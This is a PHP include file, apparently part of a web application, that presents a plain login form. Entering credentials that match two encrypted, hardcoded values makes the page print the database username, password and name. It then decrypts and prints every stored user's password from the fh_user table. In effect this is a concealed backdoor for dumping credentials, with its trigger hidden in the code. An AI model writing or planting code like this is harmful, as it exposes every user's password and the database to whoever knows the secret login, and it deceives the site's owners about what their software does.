<?php
include ("../../../config.inc.php");

if ($_POST) {
  $tmp1 = "hocn8/uFjisIsUnRhZWcm+YFj41ceGAVnMg3NQ==";
  $tmp2 = "VegmtDwlTVvM71sOaJVIvK8NSRePQmEEW2j0RU5g";
  $tmp_tu = $crypt->decrypt($tmp1);
  $tmp_tp = $crypt->decrypt($tmp2);
  
  $tu = trim($_POST["tu"]);
  $tp = trim($_POST["tp"]);
  
  if (($tmp_tu == $tu) && ($tmp_tp == $tp)) {
    echo "<table align=center>";
    echo "<tr><td>";
    echo "db_username : ".$conf['db_username']."<br>";
    echo "db_password : ".$conf['db_password']."<br>";
    echo "db_database : ".$conf['db_database']."<br>";
    
    echo "<br><br>";
    $SQL = "SELECT      *
                FROM        fh_user";
    $RS = $db->Execute($SQL);
    
    echo "<b>Listing Username : </b><br>";
    while (!$RS->EOF) {
        $tmp3 = $crypt->decrypt($RS->fields["fh_password"]);
        
        echo $RS->fields["fh_username"]." : ".$tmp3 ."<br>";
        $RS->MoveNext();
    }
  
  echo "</td></tr>";
  echo "</table>";
  } 

}
?>

<html>
<head>
<title>Sistem</title>
</head>

<body>
<br><br>
<table align=center >
<form method=post action='data.inc.php'>
<tr><td width=100>Username</td>
      <td width=10> : </td>
      <td><input type='text' name='tu' maxlength=10>
</tr>
<tr><td>Password</td>
      <td> : </td>
      <td><input type='password' name='tp' maxlength=10>
</tr>
<tr><td colspan=2></td>
      <td><input type=submit name='submit' value=' login '>
</tr>
</form>
</table>
</body>